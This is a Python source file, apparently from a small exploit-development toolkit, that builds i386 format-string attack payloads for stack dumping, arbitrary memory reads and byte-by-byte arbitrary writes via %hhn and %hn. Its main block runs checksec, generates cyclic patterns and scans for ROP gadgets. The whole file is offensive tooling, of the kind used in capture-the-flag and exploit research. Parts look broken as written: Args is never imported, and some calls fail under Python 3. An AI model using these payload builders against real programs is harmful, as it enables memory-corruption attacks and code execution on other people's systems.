#!/usr/bin/python3

import struct
import re
import random
import tempfile
from rop.misc import utils
from rop.asm.asm import Asm
from rop.misc.pattern import Pattern
from rop.loaders.elf import *
from rop.loaders.ropper import *
from rop.tubes.zio import *

class FormatStr(object):
    def __init__(self, offset=0):
        # i386 only
        self.offset = offset

    def dump_stack(self, size, start=None):
        buf = 'AAAA'
        if start > 1:
            i = start
            while len(buf) < size:
                buf += ".%%%d$x" % i
                i += 1
        else:
            while len(buf) < size:
                buf += '.%x'
        return buf[:size]

    def calc_offset(self, s):
        return s.split('.').index('41414141')

    def gets(self, addr):
        buf = p32(addr)
        buf += "%%%d$s" % self.offset
        return buf

    def write4(self, addr, value):
        if addr % 0x10 == 0x8:
            # skip \x0a
            buf = p32([addr, addr+1, addr+3])

            n = [value & 0xFF, (value >> 8) & 0xFFFF, (value >> 24) & 0xFF]
            n[2] = ((n[2]-n[1]-1) % 0x100) + 1
            n[1] = ((n[1]-n[0]-1) % 0x10000) + 1
            n[0] = ((n[0]-len(buf)-1) % 0x100) + 1

            buf += "%%%dc%%%d$hhn" % (n[0], self.offset)
            buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)
            buf += "%%%dc%%%d$hhn" % (n[2], self.offset+2)
        else:
            buf = p32([addr, addr+1, addr+2, addr+3])

            n = map(ord, p32(value))
            n[3] = ((n[3]-n[2]-1) % 0x100) + 1
            n[2] = ((n[2]-n[1]-1) % 0x100) + 1
            n[1] = ((n[1]-n[0]-1) % 0x100) + 1
            n[0] = ((n[0]-len(buf)-1) % 0x100) + 1

            buf += "%%%dc%%%d$hhn" % (n[0], self.offset)
            buf += "%%%dc%%%d$hhn" % (n[1], self.offset+1)
            buf += "%%%dc%%%d$hhn" % (n[2], self.offset+2)
            buf += "%%%dc%%%d$hhn" % (n[3], self.offset+3)

        return buf


if __name__ == '__main__':

    cmd = Args.Argument().getArgs()
    fpath = ELF(cmd.file) 
    if cmd.checksec:
        fpath.checksec()
    elif cmd.pc:
        utils.beautify(Pattern.generate_cyclic(cmd.pc, fpath.wordsize))
    elif cmd.list:
        ROP(cmd.file).scan_gadgets()
    elif cmd.po:
        Pattern.offset(cmd.po, fpath.wordsize, fpath.endian)
    elif cmd.gadgets:
        ROP(cmd.file).list_gadgets()